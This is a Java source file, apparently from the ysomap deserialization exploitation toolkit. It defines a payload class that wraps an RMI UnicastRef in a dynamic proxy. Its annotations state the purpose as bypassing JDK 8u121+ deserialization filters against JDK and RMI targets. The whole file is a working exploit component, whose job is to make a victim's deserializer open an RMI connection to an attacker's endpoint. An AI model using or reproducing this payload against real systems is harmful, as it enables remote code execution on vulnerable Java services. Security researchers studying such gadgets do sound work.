package ysomap.payloads.java.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.common.annotation.*;

import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Payloads
@Targets({Targets.JDK, Targets.RMI})
@Require(bullets = {"RMIConnectBullet"}, param = false)
@Dependencies({"using to bypass jdk>=8u121","wrapped with Dynamic Proxy"})
@Authors({ Authors.WH1T3P1G })
public class RMIConnectWrappedWithProxy extends RMIConnectWrapped {

    @Override
    public Remote pack(Object obj) throws Exception {
        return (Remote) Proxy.newProxyInstance(
                RemoteRef.class.getClassLoader(),
                new Class<?>[] { Remote.class }, // RMIServerSocketFactory.class , Activation.class
                new RemoteObjectInvocationHandler((UnicastRef) obj));
    }
}
